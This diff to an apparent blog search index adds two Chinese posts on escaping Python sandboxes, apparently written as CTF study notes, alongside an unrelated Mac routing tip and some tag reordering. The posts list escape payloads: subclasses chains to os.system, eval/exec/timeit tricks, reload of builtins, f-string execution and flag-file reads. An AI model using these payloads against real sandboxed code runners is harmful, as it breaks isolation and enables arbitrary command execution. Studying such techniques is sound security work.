@@ -1,6 +1,32 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[Python_Sandbox_Bypass]]></title>
+    <url>%2F2018%2F06%2F05%2FPython-Sandbox-Bypass%2F</url>
+    <content type="text"><![CDATA[0x01 基础关于python沙箱逃逸的基础之前的博文写过，如果有不会的可以去看看 0x02 Python Sandbox 一般的沙箱会使用1del __builtins__.__dict__[func] 这种方式来删掉敏感的模块或者函数 0x03 常规的内联函数获取方法12[].__class__.__base__.__subclasses__()[68].__init__.__globals__[&apos;os&apos;].system(&apos;whoami&apos;) //执行任意命令[].classes__.__base__.__subclasses__()[40](&apos;flag.txt&apos;).read() //读取文件 0x04 Bypass Function timeit 12import timeittimeit.timeit(&quot;__import__(&apos;os&apos;).system(&apos;ls&apos;)&quot;,number=1) eval 1eval(&quot;__import__(&apos;os&apos;).system(&apos;whoami&apos;)&quot;) exec 12exec(&quot;__import__(&apos;os&apos;).system(&apos;whoami&apos;)&quot;)exec &quot;__import__(&apos;os&apos;).system(&apos;whoami&apos;)&quot; -platform12platform.os.system(&apos;whoami&apos;)platform.popen(&apos;whoami&apos;).read() 0x05 Bypass reload方法 当del了内建模块的时候可以看看reload有没有被过滤，如果没过滤1reload(__builtins__) 寻找替代函数 可以用之前的0x03 常规的内联函数获取方法找到替代方法 字符加密 可以使用base64、rot-13这种可以可以加解密的方法绕过固定的过滤当然字符串拼接也是可以的 如果是module类型，可以使用 dict .key()来获取方法名]]></content>
+      <categories>
+        <category>Python安全</category>
+      </categories>
+      <tags>
+        <tag>Python</tag>
+        <tag>沙箱逃逸</tag>
+        <tag>Pyhon安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Python沙箱逃逸之基础篇]]></title>
+    <url>%2F2018%2F06%2F04%2FPython%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%2F</url>
+    <content type="text"><![CDATA[0x01 前言周末去参加了一波国赛的半决赛，发现全部都是python的题，之前还以为会有人把模版改成php的呢，结果都没有。。对于python也不是很熟悉，所以回来之后学习一下。 0x02 Python一般的利用方式一般python沙箱的话都是可以执行python命令的一个环境，因此我们需要知道一些敏感的函数来帮助我们getshell或者读取敏感文件等等 执行系统命令 12345os.system(&apos;whoami&apos;)os.popen(&apos;whoami&apos;)commands.getoutput(&apos;whoami&apos;)commands.getstatusoutput(&apos;whoami&apos;)subprocess.call(&apos;whoami&apos;,shell=True) 读取文件 123456fd = os.open(&apos;flag.txt&apos;,O_RDWR)os.read(fd,1024)--------------------------------------------file(&apos;flag.txt&apos;).read() //file函数python3会移除--------------------------------------------open(&apos;flag.txt&apos;).read() f_string python3.6之后引入的新特性，作用跟format差不多，但是可以执行命令1f&quot;&#123;__import__(&apos;os&apos;).system(&apos;whoami&apos;)&#125;&quot; 当然这些都是常见的利用方式，还有很多利用姿势等你解锁 0x03 Python之import在做沙箱逃逸的时候import是对于getshell是很重要的，因为我们肯定是需要引入其他包的功能来进行命令执行。一般import的用法如下： import关键字 import 函数 importlib库 123import os__import__(&apos;os&apos;)importlib.import_module(&apos;os&apos;) 0x04 Python之builtin在python中，不用引用直接就能使用的叫做内建模块，对于内建模块来说，我们要区分 builtin 、 builtins 、builtins这三者 对于 builtin 和builts来说，他们的区别在于 builtin 是对于Python2.x的，而builtins是对于Python3.x的，他们都是内建模块。当我们想使用内建函数，比如chr()的时候，其实是用的 builtins .chr()的 那么 builtins 和 builtin 又有什么区别呢，其实可以把 builtins 看作是 builtin 的一个引用，但是这个引用还要看作用域 当在 main 作用域的时候，两者没有任何区别，但是想要用 builtin 的时候，必须import才能使用， builtins 就不用import 当不再 main 作用域的时候，builtins 是 builtin . dict 的引用，是个字典 一般来说，在沙箱中经常会使用12import __builtin__del __builtin__.chr 这种方式把敏感的内建函数删除 0x05 Python之 dict 与 dir() dict 和 dir() 都可一查看模块/类/对象的属性和函数，但是并不是所有的模块/对象/类都有 dict 属性的，所以可以用dir()来获取全部的属性和函数 ##0x06 Python之 mro 与 base 与 base 在Python中mro可以获取一个类的所有父类的列表(按照方法解析顺序排列)1&quot;&quot;.__class__.__mro__ base返回父类 bases返回父类的tuple ##0x07 Python之 subclasses () 之前说的mro是获取父类的列表，那么subclasses就是获取子类的列表了。因此有一个思路就是，获取任意类的父类列表，找到object类，因为所有的类都是继承object类的，所有再使用subclasses来获取子类的列表，这样就能使用所有的类了。 0x08 参考https://xz.aliyun.com/t/52#toc-10http://www.bendawang.site/2018/03/01/%E5%85%B3%E4%BA%8EPython-sec%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/]]></content>
+      <categories>
+        <category>Python安全</category>
+      </categories>
+      <tags>
+        <tag>Python</tag>
+        <tag>沙箱逃逸</tag>
+        <tag>Pyhon安全</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[mac下双网卡同时上内网和外网]]></title>
     <url>%2F2018%2F06%2F02%2Fmac%E4%B8%8B%E5%8F%8C%E7%BD%91%E5%8D%A1%E5%90%8C%E6%97%B6%E4%B8%8A%E5%86%85%E7%BD%91%E5%92%8C%E5%A4%96%E7%BD%91%2F</url>
     <content type="text"><![CDATA[有的时候我们可能为了访问内网而给电脑插上了网线，但是默认情况下就只能访问内网了，如果我们这个时候想要访问外网的话，就只能把网线拔了，再访问外网了，实在是太麻烦了，那么今天就介绍一个mac下同时访问内网和外网的方法给大家！ 首先，插上网线，并且同时连接上能够上外网的WIFI 之后打开网络偏好设置 在左侧有个下拉箭头，选择设置服务顺序 然后通过拖动，将wifi服务弄到有线服务的上面 配置好了后就准备配置路由了，开启终端输入 1sudo route -n add -net [内网ip] -netmask [内网ip的掩码] [网管ip]]]></content>
@@ -415,8 +441,8 @@
         <category>Web安全</category>
       </categories>
       <tags>
-        <tag>Web安全</tag>
         <tag>反序列化</tag>
+        <tag>Web安全</tag>
         <tag>PHP</tag>
       </tags>
   </entry>
@@ -428,8 +454,8 @@
         <category>Web安全</category>
       </categories>
       <tags>
-        <tag>Web安全</tag>
         <tag>反序列化</tag>
+        <tag>Web安全</tag>
         <tag>Python</tag>
       </tags>
   </entry>
@@ -565,8 +591,8 @@
       <tags>
         <tag>Java</tag>
         <tag>Java安全</tag>
-        <tag>Web安全</tag>
         <tag>反序列化</tag>
+        <tag>Web安全</tag>
       </tags>
   </entry>
   <entry>
